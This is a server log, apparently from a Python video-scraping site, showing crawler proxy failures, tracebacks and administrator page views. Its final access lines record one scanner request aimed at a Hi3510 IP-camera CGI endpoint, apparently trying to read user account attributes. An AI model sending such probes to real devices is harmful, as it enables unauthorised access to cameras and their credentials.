[2021-05-16 23:26:35] [ERROR] page:148请求无数据，放入错误列表
proxy:  Status Code： 502 重试
get_json ERROR: list.remove(x): x not in list
Traceback (most recent call last):
  File "./video/func/getRequest.py", line 102, in get_json
    PROXYLIST.remove(proxy)
ValueError: list.remove(x): x not in list
None
[2021-05-16 23:26:36] [ERROR] page:149请求无数据，放入错误列表
proxy:  Status Code： 502 重试
get_json ERROR: list.remove(x): x not in list
Traceback (most recent call last):
  File "./video/func/getRequest.py", line 102, in get_json
    PROXYLIST.remove(proxy)
ValueError: list.remove(x): x not in list
None
[2021-05-16 23:26:42] [ERROR] page:140请求无数据，放入错误列表
proxy:  Status Code： 502 重试
get_json ERROR: list.remove(x): x not in list
Traceback (most recent call last):
  File "./video/func/getRequest.py", line 102, in get_json
    PROXYLIST.remove(proxy)
ValueError: list.remove(x): x not in list
None
[2021-05-16 23:26:45] [ERROR] page:136请求无数据，放入错误列表
[pid: 239511|app: 0|req: 82/488] 113.69.32.162 () {44 vars in 879 bytes} [Sun May 16 23:26:56 2021] GET /admin/view_log/ => generated 23307 bytes in 12 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 1)
[pid: 239511|app: 0|req: 83/489] 113.69.32.162 () {44 vars in 901 bytes} [Sun May 16 23:27:01 2021] GET /admin/view_log/?page=2 => generated 18512 bytes in 18 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 1)
proxy:  Status Code： 502 重试
get_json ERROR: list.remove(x): x not in list
Traceback (most recent call last):
  File "./video/func/getRequest.py", line 102, in get_json
    PROXYLIST.remove(proxy)
ValueError: list.remove(x): x not in list
None
[2021-05-16 23:27:12] [ERROR] page:120请求无数据，放入错误列表
proxy:  Status Code： 502 重试
get_json ERROR: list.remove(x): x not in list
Traceback (most recent call last):
  File "./video/func/getRequest.py", line 102, in get_json
    PROXYLIST.remove(proxy)
ValueError: list.remove(x): x not in list
None
[2021-05-16 23:27:14] [ERROR] page:118请求无数据，放入错误列表
proxy:  Status Code： 502 重试
get_json ERROR: list.remove(x): x not in list
Traceback (most recent call last):
  File "./video/func/getRequest.py", line 102, in get_json
    PROXYLIST.remove(proxy)
ValueError: list.remove(x): x not in list
None
[2021-05-16 23:27:34] [ERROR] page:104请求无数据，放入错误列表
获取到page: 100
page100保存成功
proxy:  Status Code： 502 重试
get_json ERROR: list.remove(x): x not in list
Traceback (most recent call last):
  File "./video/func/getRequest.py", line 102, in get_json
    PROXYLIST.remove(proxy)
ValueError: list.remove(x): x not in list
None
[2021-05-16 23:27:54] [ERROR] page:91请求无数据，放入错误列表
[pid: 239511|app: 0|req: 84/490] 113.69.32.162 () {44 vars in 792 bytes} [Sun May 16 23:28:06 2021] GET /favicon.ico => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
proxy:  Status Code： 502 重试
get_json ERROR: list.remove(x): x not in list
Traceback (most recent call last):
  File "./video/func/getRequest.py", line 102, in get_json
    PROXYLIST.remove(proxy)
ValueError: list.remove(x): x not in list
None
[2021-05-16 23:28:09] [ERROR] page:81请求无数据，放入错误列表
[pid: 239511|app: 0|req: 85/491] 113.69.32.162 () {46 vars in 875 bytes} [Sun May 16 23:28:10 2021] GET /video/ => generated 63744 bytes in 913 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
proxy:  Status Code： 502 重试
get_json ERROR: list.remove(x): x not in list
Traceback (most recent call last):
  File "./video/func/getRequest.py", line 102, in get_json
    PROXYLIST.remove(proxy)
ValueError: list.remove(x): x not in list
None
[2021-05-16 23:28:47] [ERROR] page:57请求无数据，放入错误列表
proxy:  Status Code： 502 重试
get_json ERROR: list.remove(x): x not in list
Traceback (most recent call last):
  File "./video/func/getRequest.py", line 102, in get_json
    PROXYLIST.remove(proxy)
ValueError: list.remove(x): x not in list
None
[2021-05-16 23:29:48] [ERROR] page:12请求无数据，放入错误列表
Exception in thread Thread-4:
Traceback (most recent call last):
  File "/usr/local/lib/python3.8/dist-packages/urllib3/connectionpool.py", line 384, in _make_request
    six.raise_from(e, None)
  File "<string>", line 2, in raise_from
  File "/usr/local/lib/python3.8/dist-packages/urllib3/connectionpool.py", line 380, in _make_request
    httplib_response = conn.getresponse()
  File "/usr/lib/python3.8/http/client.py", line 1347, in getresponse
    response.begin()
  File "/usr/lib/python3.8/http/client.py", line 307, in begin
    version, status, reason = self._read_status()
  File "/usr/lib/python3.8/http/client.py", line 268, in _read_status
    line = str(self.fp.readline(_MAXLINE + 1), "iso-8859-1")
  File "/usr/lib/python3.8/socket.py", line 669, in readinto
    return self._sock.recv_into(b)
socket.timeout: timed out

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/local/lib/python3.8/dist-packages/requests/adapters.py", line 439, in send
    resp = conn.urlopen(
  File "/usr/local/lib/python3.8/dist-packages/urllib3/connectionpool.py", line 637, in urlopen
    retries = retries.increment(method, url, error=e, _pool=self,
  File "/usr/local/lib/python3.8/dist-packages/urllib3/util/retry.py", line 367, in increment
    raise six.reraise(type(error), error, _stacktrace)
  File "/usr/local/lib/python3.8/dist-packages/urllib3/packages/six.py", line 686, in reraise
    raise value
  File "/usr/local/lib/python3.8/dist-packages/urllib3/connectionpool.py", line 597, in urlopen
    httplib_response = self._make_request(conn, method, url,
  File "/usr/local/lib/python3.8/dist-packages/urllib3/connectionpool.py", line 386, in _make_request
    self._raise_timeout(err=e, url=url, timeout_value=read_timeout)
  File "/usr/local/lib/python3.8/dist-packages/urllib3/connectionpool.py", line 306, in _raise_timeout
    raise ReadTimeoutError(self, url, "Read timed out. (read timeout=%s)" % timeout_value)
urllib3.exceptions.ReadTimeoutError: HTTPConnectionPool(host='cj.bajiecaiji.com', port=80): Read timed out. (read timeout=15)

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "./video/func/getRequest.py", line 96, in get_json
    response = requests.get(
  File "/usr/local/lib/python3.8/dist-packages/requests/api.py", line 75, in get
    return request('get', url, params=params, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/requests/api.py", line 60, in request
    return session.request(method=method, url=url, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/requests/sessions.py", line 533, in request
    resp = self.send(prep, **send_kwargs)
  File "/usr/local/lib/python3.8/dist-packages/requests/sessions.py", line 646, in send
    r = adapter.send(request, **kwargs)
  File "/usr/local/lib/python3.8/dist-packages/requests/adapters.py", line 529, in send
    raise ReadTimeout(e, request=request)
requests.exceptions.ReadTimeout: HTTPConnectionPool(host='cj.bajiecaiji.com', port=80): Read timed out. (read timeout=15)

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib/python3.8/threading.py", line 932, in _bootstrap_inner
    self.run()
  File "/usr/lib/python3.8/threading.py", line 870, in run
    self._target(*self._args, **self._kwargs)
  File "./video/func/GetPageData.py", line 87, in wrapper
    func(obj)
  File "./video/func/GetPageData.py", line 154, in add_page_to_queue
    res_dict = self.parse_url(url)
  File "./video/func/GetPageData.py", line 107, in parse_url
    return getRequest.get_json(url)
  File "./video/func/getRequest.py", line 113, in get_json
    print('爬虫网站%s 请求错误%s' % (url))
TypeError: not enough arguments for format string
[pid: 239511|app: 0|req: 86/492] 113.69.32.162 () {44 vars in 844 bytes} [Sun May 16 23:30:54 2021] GET /admin/ => generated 0 bytes in 7 msecs (HTTP/1.1 302) 7 headers in 210 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 312/493] 113.69.32.162 () {44 vars in 864 bytes} [Sun May 16 23:30:54 2021] GET /admin/login.html => generated 5722 bytes in 1 msecs (HTTP/1.1 200) 7 headers in 349 bytes (1 switches on core 0)
[pid: 239513|app: 0|req: 53/494] 113.69.32.162 () {52 vars in 1016 bytes} [Sun May 16 23:31:02 2021] POST /admin/login.html => generated 63 bytes in 5 msecs (HTTP/1.1 200) 7 headers in 324 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 313/495] 113.69.32.162 () {46 vars in 942 bytes} [Sun May 16 23:31:02 2021] GET /admin/ => generated 30384 bytes in 3 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
--------2021-05-16 23:31:06 站点2开始更新--------
[pid: 239511|app: 0|req: 87/496] 113.69.32.162 () {46 vars in 950 bytes} [Sun May 16 23:31:07 2021] GET /admin/view_log/ => generated 23374 bytes in 12 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 314/497] 113.69.32.162 () {46 vars in 972 bytes} [Sun May 16 23:31:10 2021] GET /admin/view_log/?page=3 => generated 21316 bytes in 11 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 315/498] 118.91.189.207 () {32 vars in 466 bytes} [Sun May 16 23:31:11 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
爬虫网站http://cj.bajiecaiji.com/返回状态码错误：403 proxy: 
proxy:  Status Code： 502 重试
get_json ERROR: list.remove(x): x not in list
Traceback (most recent call last):
  File "./video/func/getRequest.py", line 102, in get_json
    PROXYLIST.remove(proxy)
ValueError: list.remove(x): x not in list
None
[2021-05-16 23:31:18] [ERROR] page:20请求无数据，放入错误列表
proxy:  Status Code： 502 重试
get_json ERROR: list.remove(x): x not in list
Traceback (most recent call last):
  File "./video/func/getRequest.py", line 102, in get_json
    PROXYLIST.remove(proxy)
ValueError: list.remove(x): x not in list
None
[2021-05-16 23:31:18] [ERROR] page:22请求无数据，放入错误列表
[pid: 239510|app: 0|req: 316/499] 113.69.32.162 () {46 vars in 979 bytes} [Sun May 16 23:31:22 2021] GET /admin/view_log/?page=3 => generated 22110 bytes in 11 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 1)
proxy:  Status Code： 502 重试
get_json ERROR: list.remove(x): x not in list
Traceback (most recent call last):
  File "./video/func/getRequest.py", line 102, in get_json
    PROXYLIST.remove(proxy)
ValueError: list.remove(x): x not in list
None
[2021-05-16 23:31:25] [ERROR] page:17请求无数据，放入错误列表
已更新420条数据
出现错误页面： ['20', '22', '17']
--------2021-05-16 23:32:06 站点2更新完成--------
[pid: 239513|app: 0|req: 54/500] 113.69.32.162 () {46 vars in 906 bytes} [Sun May 16 23:31:06 2021] GET /admin/update/?url_index=2&type=today => generated 82 bytes in 60198 msecs (HTTP/1.1 200) 6 headers in 179 bytes (1 switches on core 1)
[pid: 239511|app: 0|req: 88/501] 113.69.32.162 () {46 vars in 979 bytes} [Sun May 16 23:32:11 2021] GET /admin/view_log/?page=3 => generated 22415 bytes in 13 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 1)
[pid: 239511|app: 0|req: 89/502] 113.69.32.162 () {46 vars in 979 bytes} [Sun May 16 23:34:30 2021] GET /admin/view_log/?page=4 => generated 17279 bytes in 13 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 317/503] 113.69.32.162 () {46 vars in 948 bytes} [Sun May 16 23:34:41 2021] GET /video/ => generated 63744 bytes in 285 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 318/504] 113.69.32.162 () {44 vars in 1013 bytes} [Sun May 16 23:34:50 2021] GET /video/search/?wd=%E5%90%91%E5%BE%80%E7%9A%84%E7%94%9F%E6%B4%BB&page=1 => generated 31288 bytes in 127 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239511|app: 0|req: 90/505] 113.69.32.162 () {44 vars in 1013 bytes} [Sun May 16 23:34:50 2021] GET /video/search/?wd=%E5%90%91%E5%BE%80%E7%9A%84%E7%94%9F%E6%B4%BB&page=1 => generated 31288 bytes in 119 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 319/506] 113.69.32.162 () {46 vars in 948 bytes} [Sun May 16 23:34:58 2021] GET /admin/ => generated 30384 bytes in 3 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 239513|app: 0|req: 55/507] 113.69.32.162 () {46 vars in 948 bytes} [Sun May 16 23:35:38 2021] GET /admin/ => generated 30384 bytes in 5 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
--------2021-05-16 23:35:40 站点2开始更新--------
proxy:  Status Code： 502 重试
get_json ERROR: list.remove(x): x not in list
Traceback (most recent call last):
  File "./video/func/getRequest.py", line 102, in get_json
    PROXYLIST.remove(proxy)
ValueError: list.remove(x): x not in list
None
[2021-05-16 23:35:41] [ERROR] 首页请求无数据
[pid: 239510|app: 0|req: 320/508] 113.69.32.162 () {46 vars in 906 bytes} [Sun May 16 23:35:40 2021] GET /admin/update/?url_index=2&type=count => generated 84 bytes in 1201 msecs (HTTP/1.1 200) 6 headers in 179 bytes (1 switches on core 1)
[pid: 239511|app: 0|req: 91/509] 113.69.32.162 () {46 vars in 932 bytes} [Sun May 16 23:35:45 2021] GET /admin/ => generated 30384 bytes in 3 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239512|app: 0|req: 45/510] 113.69.32.162 () {46 vars in 950 bytes} [Sun May 16 23:35:50 2021] GET /admin/view_log/ => generated 23441 bytes in 19 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
[pid: 239511|app: 0|req: 92/511] 113.69.32.162 () {46 vars in 972 bytes} [Sun May 16 23:35:53 2021] GET /admin/view_log/?page=4 => generated 18190 bytes in 12 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 321/512] 113.69.32.162 () {46 vars in 948 bytes} [Sun May 16 23:37:36 2021] GET /admin/ => generated 30384 bytes in 3 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
管理员设置：0
[pid: 239510|app: 0|req: 322/513] 113.69.32.162 () {46 vars in 890 bytes} [Sun May 16 23:37:38 2021] GET /admin/set_admin_flag/?flag=0 => generated 4 bytes in 2 msecs (HTTP/1.1 200) 6 headers in 178 bytes (1 switches on core 1)
[pid: 239512|app: 0|req: 46/514] 113.69.32.162 () {46 vars in 950 bytes} [Sun May 16 23:37:41 2021] GET /admin/view_log/ => generated 23441 bytes in 14 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 1)
[pid: 239511|app: 0|req: 93/515] 113.69.32.162 () {46 vars in 972 bytes} [Sun May 16 23:37:44 2021] GET /admin/view_log/?page=4 => generated 18413 bytes in 13 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 323/516] 113.69.32.162 () {46 vars in 995 bytes} [Sun May 16 23:39:26 2021] GET /video/ => generated 63744 bytes in 285 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 324/517] 113.69.32.162 () {44 vars in 904 bytes} [Sun May 16 23:39:28 2021] GET /video/jx-play/ => generated 9900 bytes in 3 msecs (HTTP/1.1 200) 7 headers in 349 bytes (1 switches on core 1)
[pid: 239511|app: 0|req: 94/518] 113.69.32.162 () {44 vars in 870 bytes} [Sun May 16 23:47:29 2021] GET /admin/ => generated 30384 bytes in 3 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 325/519] 113.69.32.162 () {44 vars in 1110 bytes} [Sun May 16 23:47:41 2021] GET /video/jx-play/?url_temp=https%3A%2F%2Fwww.administrator5.com%2Fadmin.php%3Furl%3D&url=%E5%90%91%E5%BE%80%E7%9A%84%E7%94%9F%E6%B4%BB => generated 9920 bytes in 2 msecs (HTTP/1.1 200) 7 headers in 349 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 326/520] 114.100.98.99 () {44 vars in 821 bytes} [Sun May 16 23:55:47 2021] GET /web/cgi-bin/hi3510/param.cgi?cmd=getp2pattr&cmd=getuserattr => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[1621180802] logsize: 43241, triggering log-reopen...
